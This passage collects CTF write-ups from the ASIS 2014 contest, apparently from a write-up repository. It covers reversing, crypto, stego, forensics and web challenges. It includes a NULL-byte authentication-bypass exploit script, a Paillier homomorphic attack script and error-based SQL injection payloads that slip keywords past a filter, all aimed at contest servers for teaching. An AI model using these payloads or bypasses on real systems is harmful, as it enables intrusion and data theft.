4] | ! ! a[27] ) & ( a[50] | ! a[153] ) & ( a[289] | ! a[237] ) & ( a[258] | ! ! a[163] ) & ( ! a[132] | a[138] ) & ( ! a[125] | ! a[140] ) & ( ! a[32] | a[185] ) & ( ! a[228] | ! a[12] ) & ( ! a[103] | ! ! a[236] ) & ( ! a[69] | ! a[276] ) & ( a[13] | a[35] ) & ( ! a[4] | ! a[72] ) & ( ! a[109] | ! a[139] ) & ( ! a[125] | ! ! a[140] ) & ( ! a[108] | ! a[202] ) & ( a[90] | ! ! a[75] ) & ( ! ! a[164] | ! a[204] ) & ( ! a[65] | ! a[43] ) & ( ! a[16] | ! a[135] ) & ( a[174] | a[66] ) & ( a[94] | a[241] ) & ( a[144] | ! ! a[48] ) & ( ! a[77] | ! ! a[178] ) & ( ! a[9] | ! ! a[287] ) & ( ! a[240] | a[190] ) & ( ! ! a[223] | ! a[101] ) & ( ! a[186] | ! a[95] ) & ( ! a[90] | ! a[75] ) & ( ! ! a[219] | ! a[227] ) & ( ! ! a[44] | ! a[128] ) & ( a[281] | ! a[104] ) & ( ! a[21] | ! ! a[151] ) & ( a[13] | ! a[35] ) & ( ! a[99] | ! a[24] ) & ( ! a[42] | a[221] ) & ( ! a[292] | ! ! a[206] ) & ( ! a[20] | a[30] ) & ( ! a[228] | ! ! a[12] ) & ( a[49] | ! ! a[239] ) & ( a[57] | ! ! a[173] ) & ( ! a[223] | ! a[101] ) & ( ! a[255] | a[105] ) & ( ! ! a[78] | ! a[248] ) & ( ! a[148] | ! ! a[3] ) & ( ! a[53] | a[229] ) & ( ! a[246] | ! a[97] ) & ( ! ! a[103] | ! a[236] ) & ( ! a[219] | ! ! a[227] ) & ( ! a[289] | ! a[237] ) & ( ! ! a[4] | ! a[72] ) & ( ! ! a[222] | a[273] ) & ( a[98] | a[8] ) & ( a[280] | ! ! a[55] ) & ( ! ! a[107] | a[209] ) & ( ! ! a[284] | a[270] ) & ( a[133] | a[157] ) & ( a[272] | a[208] ) & ( ! a[223] | ! ! a[101] ) & ( a[260] | a[6] ) & ( a[257] | a[266] ) & ( a[160] | ! a[159] ) & ( a[109] | ! ! a[139] ) & ( ! a[255] | ! a[105] ) & ( a[240] | ! a[190] ) & ( ! ! a[5] | a[195] ) & ( ! a[210] | ! a[213] ) & ( ! a[259] | ! a[142] ) & ( ! a[164] | ! ! a[204] ) & ( ! a[147] | a[177] ) & ( ! ! a[59] | ! a[199] ) & ( ! ! a[136] | ! a[235] )\n\n"
```

Why that's a very large 2-SAT formula! Right after decrypting the 2-SAT formula, the program checks whether `argv[1]` is present, and whether it consists only of `0`'s  and `1`'s. Additionally the argument must have a length of `295`. Notice that in the 2-SAT formula the highest index is `294`. This matches the requirement that the argument must have a length of `295`. It appears the argument encodes the assignment to each variable, and that this assignment must satisfy the formula.

Using [`pycosat`](https://pypi.python.org/pypi/pycosat) we can easily solve the 2-SAT formula:

```python
import re, pycosat

formula = "( a[253] | ! a[218] ) & [.. see gdb output ..]"
re_index = re.compile(r'a\[(\d+)\]')

def parse_literal(literal):
    negs = 1 if literal.count("!") % 2 == 0 else -1
    num = int(re_index.search(literal).group(1)) + 1
    return negs * num

def parse_clause(clause):
    literals = clause.split(" | ")
    return [parse_literal(l) for l in literals]

def parse_formula(formula):
    clauses = [clause[2:-2] for clause in formula.split(" & ")]
    return [parse_clause(clause) for clause in clauses]

cnf = parse_formula(formula)
solution = pycosat.solve(cnf)
print "Solution:", "".join(['1' if x > 0 else '0' for x in solution])
```

Running the challenge with as argument the solution gives us the flag:

```bash
$ ./2satreloaded 1000001010100110100100101010011010111110011001000110000011000010011011000110100011001010011100100110101001101110110001100111001001101100011000101100001001100100110001001100101011000010110010100111001011000100110001000110010001100110011000001100010001100110011010100110001011000100110001101100001
ASIS_20a64e957c961a2beae9bb230b351bca
```

## Other write-ups and resources

* [Write-up by Souhail Hammou](http://rce4fun.blogspot.be/2014/10/asis-ctf-finals-2014-satellite-reloaded.html)
* [Write-up by Balalaika Cr3w](http://ctfcrew.org/writeup/83)# ASIS Cyber Security Contest Finals 2014: Secure hobby

**Category:** Pwn
**Points:** 250
**Description:**

> [File](hobby_8524ad2ae5fde9a43d7e6b1956c8099b) is running here:
>
> ```bash
> nc asis-ctf.ir 12439
> ```

## Write-up

Let’s see what [the provided file](hobby_8524ad2ae5fde9a43d7e6b1956c8099b) could be:

```bash
$ file hobby_8524ad2ae5fde9a43d7e6b1956c8099b
hobby_8524ad2ae5fde9a43d7e6b1956c8099b: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < hobby_8524ad2ae5fde9a43d7e6b1956c8099b > hobby`
* `unxz < hobby_8524ad2ae5fde9a43d7e6b1956c8099b > hobby`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x hobby_8524ad2ae5fde9a43d7e6b1956c8099b
```

Let’s find out what the extracted file is:

```bash
$ file hobby
hobby: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
```

## The Challenge

Let's connect to the service to see what we're dealing with

```bash
$ nc asis-ctf.ir 12439
-------------------------------------------------
| 	Welcome to Super Secure Auth Engine	|
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
1
Enter username: admin
Kidding Me? :(
```

So we cannot register the username `admin`. Registering other usernames does work, in which case we are given a key.

```bash
Enter username: hacknamstyle
Your key for login is: 6147466a6132356862584e306557786c95a6d58cd2be3f87ff4a27e51afaff87
```

This key can then be given as input to option two or three:

```bash
2
Enter key: 6147466a6132356862584e306557786c95a6d58cd2be3f87ff4a27e51afaff87
OK
User hacknamstyle authenticated

[..]

3
Enter key: 6147466a6132356862584e306557786c95a6d58cd2be3f87ff4a27e51afaff87
You don't have any secret! :(
```

From the output of option two we notice that the key somehow encodes the username (and probably some secret authentication code). It's likely that the secret associated with the `admin` username contains the flag. Let's load the binary in IDA to see whether we can calculate the key for `admin` ourselves. We notice that the code appears obfuscated and/or that the executable is packed (IDA detected few functions and the executable is not importing many API functions). Running `strings` on the executable reveals that it's packed with UPX.

```bash
$ strings hobby | grep -i upx
UPX!
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $
UPX!u
UPX!
UPX!
```

We can easily unpack this using [public UPX tools](http://upx.sourceforge.net/). Now we get a normal looking executable in IDA.

After some reversing, we have that the program reads the file `namak` on start-up, and saves the content to a global variable. When calculating the key for a user, this secret data appears to be used. Hence, since we don't know the content of the file, it appears we cannot calculate a valid key ourselves. However, while reversing the key generation algorithm, we notice that `strstr` is being used to check whether the username contains the string `admin`. Is it possible to bypass this check by including a leading NULL byte in the username? The answer is yes! Hence we get the key of the admin by using the username `\x00admin`. This key can then be used to read the secret of the admin (which is of course the flag):

```python
from netcatlib import *

# Get the key for admin
nc = Netcat('asis-ctf.ir', 12439)
nc.write("1\n")
nc.read_until("Enter username: ")
nc.write("\x00admin")
nc.read_until("Your key for login is: ")
key = nc.read_until("\n")
print "[+] Key for admin is", key,

# Get the secret of admin
nc = Netcat('asis-ctf.ir', 12439)
nc.write("3\n")
nc.read_until("Enter key: ")
nc.write(key)
nc.read_until("The flag is: ")
print "[+] Secret of admin:", nc.read_all()
```

The output of the script is:

```python
[+] Key for admin is 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
[+] Secret of admin: ASIS_65cc76f02093977bfd7629086e813666
```

## Other write-ups and resources

* <http://barrebas.github.io/blog/2014/10/31/asis-ctf-secure-hobby/>
* [Alternative Exploit in Python](http://pastebin.com/b2QVFK2U)
* [French](https://t0x0sh.org/asis-ctf-finals-hobby-pownable-250.html)
# ASIS Cyber Security Contest Finals 2014: Square

**Category:** Crypto, PPC
**Points:** 150
**Description:**

> Hey, this string is generated by this [code](square_244cb89b17a1105d7f2756c917af196e), can you capture the flag?
>
> `42598113503607816275290739917038018215431555012399274191982894`

## Write-up

Let’s see what [the provided file](square_244cb89b17a1105d7f2756c917af196e) could be:

```bash
$ file square_244cb89b17a1105d7f2756c917af196e
square_244cb89b17a1105d7f2756c917af196e: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < square_244cb89b17a1105d7f2756c917af196e > square`
* `unxz < square_244cb89b17a1105d7f2756c917af196e > square`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x square_244cb89b17a1105d7f2756c917af196e
```

Let’s find out what the extracted file is:

```bash
$ file square
square: a python script text executable
```

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Finals 2014: Stop!

**Category:** Stego, Crypto
**Points:** 150
**Description:**

> In this [file](stop_53e41e604422d4fa824490ca852dfecb), flag is hidden, find it! and don't stop!

## Write-up

Let’s see what [the provided file](stop_53e41e604422d4fa824490ca852dfecb) could be:

```bash
$ file stop_53e41e604422d4fa824490ca852dfecb
stop_53e41e604422d4fa824490ca852dfecb: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < stop_53e41e604422d4fa824490ca852dfecb > stop`
* `unxz < stop_53e41e604422d4fa824490ca852dfecb > stop`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x stop_53e41e604422d4fa824490ca852dfecb
```

Let’s find out what the extracted file is:

```bash
$ file stop
stop: MPEG sequence, v2, program multiplex
```

Renaming the file to `stop.mpeg` allows us to open it in our video player of choice.

The movie features a stop sign (an octagon) that rotates to 8 different positions:

![](example-frame.jpg)

Some frames have a dot in the corner to the upper left of the ‘STOP’ text (like in the above example), others don’t.

So, in total there are 16 different kinds of images used as as frame.

Let’s extract all frames:

```bash
$ ffmpeg -i stop.mpeg -ss 00:00:00 -t 60 -qscale 0 -f image2 frame-%04d.png
```

Now we go through each of the frames, starting at `frame-0000.png`, and assign a hexadecimal digit every time the image changes to another one of the 16 variations, like so:

* STOP with no rotation and no dot: `0`
* STOP with 135° rotation and no dot: `1`

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Finals 2014: TicTac

**Category:** Forensics
**Points:** 200
**Description:**

> Find flag in [this](tictac_4c56077190984fde63900b3ba14d11dd) file

## Write-up

Let’s see what [the provided file](tictac_4c56077190984fde63900b3ba14d11dd) could be:

```bash
$ file tictac_4c56077190984fde63900b3ba14d11dd
tictac_4c56077190984fde63900b3ba14d11dd: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < tictac_4c56077190984fde63900b3ba14d11dd > tictac`
* `unxz < tictac_4c56077190984fde63900b3ba14d11dd > tictac`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x tictac_4c56077190984fde63900b3ba14d11dd
```

Let’s find out what the extracted file is:

```bash
$ file tictac
tictac: data
```

However, `tictac` seems to be a packet capture file.
Running `strings` on this file reveals a number of hex-encoded strings:

```
7069636b206d653a204153
7069636b206d653a204153
7069636b206d653a204953
7069636b206d653a204953
7069636b206d653a205f36
7069636b206d653a206435
7069636b206d653a206435
7069636b206d653a203461
7069636b206d653a203461
7069636b206d653a203637
7069636b206d653a203637
7069636b206d653a203635
7069636b206d653a203635
7069636b206d653a203965
7069636b206d653a203965
7069636b206d653a203435
7069636b206d653a206564
7069636b206d653a206265
7069636b206d653a203633
7069636b206d653a206262
7069636b206d653a206639
7069636b206d653a203039
7069636b206d653a203039
7069636b206d653a206536
7069636b206d653a206231
7069636b206d653a203833
7069636b206d653a203833
7069636b206d653a206120
7069636b206d653a206120
7069636b206d653a20
7069636b206d653a20
```

The first decoded to `pick me: AS`, indicating it probably contains the flag:

```bash
$ head -1 extracted-hex.txt | xxd -r -ps
pick me: AS
```

Some hex-strings are duplicates, so we only take the unique ones and decode
all of them to form the flag:

```bash
$ uniq extracted-hex.txt | xxd -r -ps | sed 's/pick me: //g'
ASIS_6d54a67659e45edbe63bbf909e6b183a
```

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2014/10/asis-ctf-finals-2014---tictac-200pts-writeup>
* <http://shankaraman.wordpress.com/2014/10/14/asis-ctf-2014-finals-tictac-writeup/>
* <http://tasteless.eu/2014/10/asis-ctf-finals-2014-tictac-forensics-200/>
* <http://bruce30262.logdown.com/posts/237427-asis-ctf-finals-2014-tictac>
# ASIS Cyber Security Contest Finals 2014: Ultra Secure

**Category:** Crypto
**Points:** 400
**Description:**

> Connect there:
>
> ```bash
> nc asis-ctf.ir 12445
> ```

## Write-up

First let's connect to the service and see what we need to do

```bash
$ nc asis-ctf.ir 12445

    Here we use a well-known cryptosystem, which introduced in late 90s as a part of PhD Thesis. This cryptosystem is a probabilistic asymmetric algorithm, so computer nerds are familiar with the basics. The power of this cryptosystem is based on the fact that no efficient general method for computing discrete logarithms on conventional computers is known. In real world it could be used in a situation where there is a need for anonymity and a mechanism to validate, like election.
What's the name of this cryptosystem?
```

If you google some of key features of this cryptosystem we quickly come to the conclusion that this is a [Paillier cryptosystem](http://en.wikipedia.org/wiki/Paillier_cryptosystem). Answering Paillier gives us new information.

```bash
$ nc asis-ctf.ir 12445

...

What's the name of this cryptosystem?
Paillier
The secret is: 45710623737087701711820134797542238364727935815041561117965550719730211404995880962189849763186419941404256428269541230638298594081804054803929405338706331501510355769791788035782101048794197150178174026969607210826909631760346060869225182396182048777369368142016863385200586265163953840808342248328628488558966204179925698305553258440383522033840372138701862745580428470631799476191017336213672662419943702985732053645939959855799510630518494500337262650866518227631714070805564029135334485129969768206948775297659476280347999959347004640627153560223776086816027050734375066512946795924861244218488564290260122095
Tell us your choise:
------------------------
[E]ncrypt: [D]ecrypt:
```

It seems like we can encrypt and decrypt messages and we can but there are some limitations: 
*   We can only encrypt/decrypt integers
*   We can't decrypt the secret (duh it's likely the flag)
*   We can't decrypt/encrypt really large numbers. 

An interesting feature of the Paillier system is the [Homomorphic properties](http://en.wikipedia.org/wiki/Paillier_cryptosystem#Homomorphic_properties). This identity is really usefull:

```
D(E(m_1, r_1)*E(m_2, r_2) % n**2) = m_1 + m_2 % n
```

This means we can know `D(secret) + m_2` by decrypting the encrypted version of `m_2` multiplied with `secret`. But since we can't decrypt large numbers (and `secret*E(m_2)` will be very large) we will need to find `n**2` so the program can decrypt it. To do that we will have to find the highest decryptable number since the number higher than that one will be `n**2`. Note you can also search for the highest encryptable number and this will result in `n`. I used a [script](getflag.py) to search for `n**2`. The way we searched for `n**2` is seperated in steps. First we search for the size of `n**2`

```python
while limitsearch:
    print "upperlimit = %s" %up
    s.sendall("D\n")
    s.recv(2048)
    s.sendall("%s\n" %up)
    result = s.recv(2048)
    # printing server output for debugging purposes
    print result
    if "Your original message is" in result:
        print "raise limits"
        lo = up
        up = up*10
    else:
        print "limits found:\n"
        print "upperlimit:%s\n" %up
        limitsearch = False
    s.recv(2048)
```

After we've found the size we can use a [binary search algorithm](http://en.wikipedia.org/wiki/Binary_search_algorithm) to efficiently find our n, below is the python snippet

```python
while nsearch:
    n2 = (lo + up) // 2
    print "n**2 = %s" %(n2)
    s.sendall("D\n")
    s.recv(2048)
    s.sendall("%s\n" %n2)
    result = s.recv(2048)
    print result
    if "Your original message is" in result:
        print "raise lowerlimit"
        lo = n2
    elif "Your secret is too long" in result:
        print "lower upperlimit"
        up = n2
    else:
        print "found n**2: ", n2+2
        nsearch = False
    if (lo == up) or (lo+1 == up):
        print "found n**2: ", n2+2
        nsearch = False
    s.recv(2048)
```

The script gives us the following `n**2`

```
312297583190587351458137431380785408561144079636591681208619346428876861270850912733847184254477966663881634771561389507014978092603348639752023175244091649730048589982867752333512863931604180416460758858834247438893704154885898939981322625658760458931477676038950504043387828218684225085126061041045616606366038003171348569328265909629270290356532433942132981636025919553658034062710641354232206614287339987328297437585450601990328499529000849761619575357764721850032262663234053608997621038879298169658587018163190471754083729630359432041430309138927003684672819536681979821421566465558117262044624406325139876689
```

All thats left to do is encrypt a simple number like `1` multiply the secret thats given at the start with this encrypted `1` take modulo `n**2`  of the calculated number and give the result back for decryption. That decrypted message is your flag + `1`. You'll be left over with an integer so translate the integer to hex and decode the hex to ascii for your flag. 

```python
m2 = 1
n2 = n2+2
s.sendall("E\n")
print s.recv(2048)
s.sendall("%s\n" %m2)
em2 = s.recv(2048)
print em2
em2 = em2.split()[3]
print s.recv(2048)
s.sendall("D\n")
print s.recv(2048)
todecrypt = int(secret)*int(em2)%n2
s.sendall("%s\n" %todecrypt)
result = s.recv(2048)
print result
result = int(result.split()[4])-1
print hex(result)[2:-1].decode('hex')

```

The flag is `ASIS_85c9febd4c15950ab1f19a6bd7a94f85`.

## Other write-ups and resources

* <http://tasteless.eu/2014/10/asis-ctf-finals-2014-ultra-secure-crypto-400/>
* <http://bt3gl.github.io/on-paillier-binary-search-and-the-asis-ctf-2014.html>
* <http://blog.dragonsector.pl/2014/10/asis-ctf-finals-2014-ultra-secure.html>
* [Exploit written in Python](http://pastebin.com/LsMRp71Y)
* <https://beagleharrier.wordpress.com/2014/10/15/asis-ctf-finals-2014ultra-secure-writeup/>
# ASIS Cyber Security Contest Finals 2014: Voting

**Category:** Web
**Points:** 175
**Description:**

> Go here:
> <http://asis-ctf.ir:12441/>

## Write-up

This website shows a poll for operating systems where the user can choose between Windows, Linux and Mac. When submitting your choice, the following data is submitted:

```
os=Linux&submit=Submit
```

That’s not a lot of data, so let’s try some basic SQL injection: `os=Linux'&submit=Submit`. This gives the following error:

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''Linux''' at line 1
```

That’s very interesting. We can use this error, to give us data by creating a malformed XPATH query:

```
os=Linux'-updatexml(0,concat('.',(SELECT group_concat(table_name) FROM information_schema.columns where table_schema != 'information_schema' LIMIT 10 ),'1'),2)#&submit=Submit
```

The result:

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(0,concat('.',( group_concat(table_name) infmation_schema.columns table_schema' at line 1
```

That’s not the result we wanted, but still interesting. It appears some of our keywords were stripped, such as `where`, `select` and `from`. It also removed the `or` in `information`. Let’s try a simple trick:

```
os=Linux'-upUPDATEdatexml(0,concat('.',(SselectELECT group_concat(table_name) FfromROM infoORrmation_schema.columns wwherehere table_schema != 'infoORrmation_schema' LlimitIMIT 10 ),'1'),2)#&submit=Submit
```

This gives us `XPATH syntax error: 'tbl_flag,tbl_flag,tbl_poll,tbl_p'`. The `tbl_flag` must contain our flag.

```
os=Linux'-upUPDATEdatexml(0,concat('.',(SselectELECT substr(flag,1,30) FfromROM tbl_flag),'1'),2)#&submit=Submit
```

This results in:

```
XPATH syntax error: 'ASIS_1dc337d61dac5cb910eb5b8c11'
```

Almost there. The XPATH error has a fixed size, so our flag is incomplete. We’ll have to execute the injection one more time:

```
os=Linux'-upUPDATEdatexml(0,concat('.',(SselectELECT substr(flag,20,30) FfromROM tbl_flag),'1'),2)#&submit=Submit
```

Putting these pieces together results in `ASIS_1dc337d61dac5cb910eb5b8c17c52fef1`, which is the flag.

## Other write-ups and resources

* <http://tasteless.eu/2014/10/asis-ctf-finals-2014-voting/>
# ASIS Cyber Security Contest Finals 2014: What you see?

**Category:** Stego
**Points:** 175
**Description:**

> Download the [file](milad_eb1ac478beffbbd33c564fbe6396042f).

## Write-up

Let’s see what [the provided file](milad_eb1ac478beffbbd33c564fbe6396042f) could be:

```bash
$ file milad_eb1ac478beffbbd33c564fbe6396042f
milad_eb1ac478beffbbd33c564fbe6396042f: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < milad_eb1ac478beffbbd33c564fbe6396042f > milad`
* `unxz < milad_eb1ac478beffbbd33c564fbe6396042f > milad`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x milad_eb1ac478beffbbd33c564fbe6396042f
```

Let’s find out what the extracted file is:

```bash
$ file milad
milad: PNG image data, 1200 x 800, 8-bit/color RGB, non-interlaced
```

The PNG file did not contain any apparent stego elements. Googling for the photography studio which made the image (Behrouz Jafarnezhad Photography) quickly lead us to [the page with the original image](http://behrouzjafarnezhadphotography.com/2012/02/17/tehran-so-close-so-far/). Unfortunately, the image displayed there had different dimensions (1024×682 vs. 1200×800). If you could somehow find the original image, we could diff it with the provided challenge image. The URL of the image we found was:

```
http://behrouzjafarnezhadphotography.com/wp-content/uploads/2012/02/IMG_3422-1024x682.jpg
```

We tried replacing the dimensions in the URL to the correct ones, but that resulted in a 404 page:

```
http://behrouzjafarnezhadphotography.com/wp-content/uploads/2012/02/IMG_3422-1200x800.jpg
```

After the CTF we learned that when the dimensions are omitted from the URL entirely, the original-size image is loaded.

```
http://behrouzjafarnezhadphotography.com/wp-content/uploads/2012/02/IMG_3422.jpg
```

Diffing this with the challenge image reveals some very subtle red dots that form a penguin when connected.

![](diff.png)

However, since we didn’t manage to discover all that during the CTF, we took a different approach…

Before submitting a potential flag was submitted to the ASIS servers, it was first checked for validity on the client side. More concretely: the flag was `SHA256()`’d twice, and compared with a certain value. Since we knew the format of the flag (`ASIS_MD5()`), we decided to see if they included frequently used words/passwords. We quickly fired up a Python script, which would go through [the list of the famously leaked RockYou passwords](https://wiki.skullsecurity.org/index.php?title=Passwords), compute the hashes, and compare them with the SHA256 value provided by ASIS. Seconds later, we found the correct answer for the “What you see?” challenge was `ASIS_MD5(penguin)`. Without having to jump through too many hoops to find and diff the original image, we happily submitted the flag: `ASIS_24f7ca5f6ff1a5afb9032aa5e533ad95`.

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Finals 2014: XORQR

**Category:** PPC
**Points:** 150
**Description:**

> Connect here and find the flag:
>
> ```bash
> nc asis-ctf.ir 12431
> ```

## Write-up

_This write-up is made by Steven of the [HacknamStyle](http://hacknamstyle.net/) CTF team._

This challenge sends, after you send "START", a blob of text consisting of "-" and "+"
characters formatted in a square, such as this one:

```
-+++++-+---++-+-----+
-------++--++-+++++++
--+++--++--++-++---++
--+++--++--++-++---++
--+++--++-----++---++
-------++++---+++++++
-+++++-++-----+-----+
+-----++---+---+++++-
+-+--+--+--+-+-------
-+++-++-++--+--+++--+
-+++-+-++++-+--+++++-
+--++-++--++++-+--+--
++--++--+--+++-++-++-
+-----+++-+-+-++++---
-+++++-++--+++---++-+
-------++-++++-+++++-
--+++--+--++-------++
--+++--+---++++++-++-
--+++--+++-++++++-+-+
-------+--+++-+-+--++
-+++++-+--++++-++-+-+
```

This blob represents a QR code where each character represents either a white or
black pixel. The QR code is mangled so that some rows and columns have been inverted.
With information from wikipedia about [QR codes](http://en.wikipedia.org/wiki/QR_code)
we can see that the QR code can be restored by making sure that the Position
and Alignment patterns are shown correctly.
After that, it's just a matter of decoding the restored QR code and submitting
the decoded text. After 15 rounds or so, where the server sometimes injects "?"
instead of "-" or "+", which automatically gets repaired, we get the flag.

```
Congratulations! The flag is ASIS_68d47fab03368ff94025a4f4a1dabf0f
```

The script to solve this challenge is in ```solve-xorqr.py```, and 15 QR codes
received and restored from the server are in ```example-qrs```.

## Other write-ups and resources

* <https://github.com/arkty/asis-ctf-finals-2014-xorqr>
* <http://blog.squareroots.de/en/2014/10/asis-finals-2014-xoror-ppc-150/>
# ASIS Cyber Security Contest Quals 2014: Archaic

**Category:** Crypto
**Points:** 300
**Description:**

> [file](crypto_300_5e5d1adf0bb2ca58131ca28878a4b907)

## Write-up

I started to 'crack' this challenge long after the CTF but luckily for us this challenge is completely offline. You get everything you need from the [given source file](crypto_300_5e5d1adf0bb2ca58131ca28878a4b907).

When you open the source file (and after you unpack it) you'll see that you're given 3 files (I've also included these in the write-up):

* [A python script](archaic.py)

* [A public key](pubKey.txt)

* [An encrypted message](enc.txt)


So let's start by studying the python code. The most important thing here is not the encryption method but rather the method of how the encryption keys are made. 

```python
def makeKey(n):
	privKey = [random.randint(1, 4**n)]
	s = privKey[0]
	for i in range(1, n):
		privKey.append(random.randint(s + 1, 4**(n + i)))
		s += privKey[i]
	q = random.randint(privKey[n-1] + 1, 2*privKey[n-1])
	r = random.randint(1, q)
	while gmpy2.gcd(r, q) != 1:
		r = random.randint(1, q)
	pubKey = [ r*w % q for w in privKey ]
	return privKey, q, r, pubKey
```

If you analyze this you might notice this is a [Merkle-Hellman cryptosystem](http://en.wikipedia.org/wiki/Merkle%E2%80%93Hellman_knapsack_cryptosystem), this is also easy to find by googling a snippet of the code. The Merkle-Hellman cryptosystem is a very old cryptosystem and has already been broken. So all that's left for us to do, is to find the attack method and try that on our encrypted message.

The attack method makes use of some complicated math but I'll try to explain the general idea. If you want to know the details I refer you to the [included paper](Merkle_Hellman_Attacks.pdf) or you can find plenty of other research and papers online.

The basic idea is that you make a large matrix `A` of the following form:

```
| I(nxn)  O(nx1) |
| P(1xn) -C(1x1) |
```

Where `I` represents an Identity matrix, `O` a matrix full of `0`, `P` is your public key and `C` is your encrypted message. The numbers between parentheses are the dimensions of the matrix with `n` representing the length of the public key. If you use the LLL lattice reduction algorithm on this matrix you should get short vectors spanned by this matrix. Among those short vectors is a possible solution to the encryption problem (if you encrypt that solution with the public key you would get the same encrypted message). To find that solution between all those vectors you need to look for a vector which consists of only `1's` and `0's`. Why `1's` and `0's`? Because that's how the encrypted message is created. It takes the binary bits of your text and multiplies them with the public key. This is effectively the same as multiplying a vector of `1's` and `0's` with the public key vector. 

Now we need to create that matrix I proposed and we need to create/use the LLL lattice reduction algorithm. Since the LLL algorithm is complicated and long I tried to find one for python unfortunately my search was unsuccessful. I did however find a program called [sage](http://www.sagemath.org/). This program comes with a lot of mathematical functions including the LLL algorithm. The beautiful part of it is you can import it in python as a library. I opted to use the cloud application of sage but normally the code should be the same.

[The code I used in sage](sage.py) looks like:

```python
# open the public key and strip the spaces so we have a decent array
fileKey = open("pubKey.txt", 'rb')
pubKey = fileKey.read().replace(' ', '').replace('L','').split(',')
nbit = len(pubKey)
# open the encoded message
fileEnc = open("enc.txt", 'rb')
encoded = fileEnc.read().replace('L','')
print "start"
# create a large matrix of 0's (dimensions are public key length +1)
A = Matrix(ZZ,nbit+1,nbit+1)
# fill in the identity matrix
for i in xrange(nbit):
    A[i,i] = 1
# replace the bottom row with your public key
for i in xrange(nbit):
    A[i,nbit] = pubKey[i]
# last element is the encoded message
A[nbit,nbit] = -int(encoded)

res = A.LLL()
resfil = open("res.txt", 'wb')
resfil.write(res.str())

# print solution
M = res.row(295).list()
print M
```

Then you need to search the correct vector in the created text file. It is important to note that the last number (`0` or `1`) is not part of the message and should be dropped. [Encode the binary to ascii and you get the flag](binasc.py).

The flag is `ASIS_9bd3d5fd2422682c19568806a07061ce`.

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: Auth

**Category:** Reverse, PPC
**Points:** 150
**Description:**

> The Server is running at the following address. [file](re_150_36f68dc6c8821f4b8fc80e5f74b56e32)
> 87.107.124.12:25565

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: Blocks

**Category:** Crypto, Stego
**Points:** 100
**Description:**

> [stego\_100\_e62586adf1bcc7de668fa562955c0aa5](stego_100_e62586adf1bcc7de668fa562955c0aa5)

## Write-up

After extracting the xz-compressed POSIX tar archive, we are given a file, `stego_100_e62586adf1bcc7de668fa562955c0aa5f`, which is a `361x361` (Factorization of `361`: `19x19`) pixel wide and high picture:

```
$ file stego_100_e62586adf1bcc7de668fa562955c0aa5f
stego_100_e62586adf1bcc7de668fa562955c0aa5f: PNG image data, 361 x 361, 8-bit/color RGBA, non-interlaced
```

We open the picture and see this:

![](stego_100_f78a3acde659adf7ceef546380e49e5f)

There are `19x19` black or white blocks, which are each again `19x19` pixels wide and high.
We suggest that a black/white block represents a `0`/`1`.

Now we stegoanalyse this picture to notice any peculiarities using [Stegsolve](http://www.wechall.net/download/12/Stegsolve_jar) and find a hidden `19x19` block in the alpha channel (alpha plane 0):

![](alphaplane0.png)

Xoring the binary representation of the original image with this alpha block using [this script](picxoralpha.py) ([source](http://hexpresso.wordpress.com/2014/05/10/asis-ctf-quals-2014-stego-100-blocks-write-up/)), we are getting the flag:

> flag  = ASIS_08213db585ffe1c93c8f04622c319594

## Other write-ups and resources

* <http://hexpresso.wordpress.com/2014/05/10/asis-ctf-quals-2014-stego-100-blocks-write-up/>
# ASIS Cyber Security Contest Quals 2014: Bomb

**Category:** Reverse, PPC
**Points:** 150
**Description:**

> During the Islamic revolution of 1979, a secret file was found that we think it shows the date designated for a future bombing. Find the time for that attempt.
> [file](re_150_94e0cc6ec62cef03578f6db7cf082d96)
> Caution: This program only simulates the bomb trigger.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: Bonus

**Category:** Trivia
**Points:** 75
**Description:**

> There will be bonus points for the teams that submit the most interesting screenshots of working flow, tools and other CTF related stuff to our Email address.
> Maximum 3 pictures
> Make sure you include your team name in the email
# ASIS Cyber Security Contest Quals 2014: Censored array

**Category:** Crypto, PPC
**Points:** 1
**Description:**

> ```bash
> nc 87.107.123.4 9301
> ```

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: Easy Reading

**Category:** Stego, Forensic
**Points:** 200
**Description:**

> Read the attached text and find the flag
> [file](stego_200_18c49be05801a16188e1f23e35d4798c)
> No need to calculate MD5 or appending `ASIS_`
>
> Hint: Dashing!

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: ECC

**Category:** Crypto
**Points:** 150
**Description:**

> In the Menezes-Vanstone cryptosystem, we have m2, c1, c2 for a NIST-P-256 elliptic curve.
> [file](crypto_150_165ecb5d4c31280c2ea82c670dfe26e3)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Quals 2014: forensic

**Category:** Forensic
